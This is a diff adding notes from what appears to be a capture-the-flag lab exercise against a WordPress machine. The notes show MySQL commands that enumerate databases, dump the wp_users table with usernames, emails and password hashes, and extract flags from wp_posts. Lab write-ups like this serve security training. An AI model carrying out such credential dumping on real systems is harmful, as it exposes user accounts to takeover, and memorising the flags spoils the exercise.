@@ -1,0 +1,60 @@
+#Step 1 when in mysql
+
+mysql> show databases;
+#output:
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| wordpress          |
++--------------------+
+4 rows in set (0.00 sec)
+
+#Step 2
+mysql> use wordpress;
+#output:
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+
+#Step 3
+mysql> show tables;
+#output:
++-----------------------+
+| Tables_in_wordpress   |
++-----------------------+
+| wp_commentmeta        |
+| wp_comments           |
+| wp_links              |
+| wp_options            |
+| wp_postmeta           |
+| wp_posts              |
+| wp_term_relationships |
+| wp_term_taxonomy      |
+| wp_termmeta           |
+| wp_terms              |
+| wp_usermeta           |
+| wp_users              |
++-----------------------+
+12 rows in set (0.00 sec)
+
+#Step 3 
+mysql> select * from wp_users;
+#output :
++----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
+| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |
++----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
+|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     |           0 | michael        |
+|  2 | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     |           0 | Steven Seagull |
++----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
+2 rows in set (0.00 sec)
+
+#Step 4 
+mysql> select * from wp_posts;
+#output
+#THERE IS A LOT NONSENSE AS WELL BUT 
+flag3{afc01ab56b50591e7dccf93122770cd2}
+flag4{715dea6c055b9fe3337544932f2941ce}
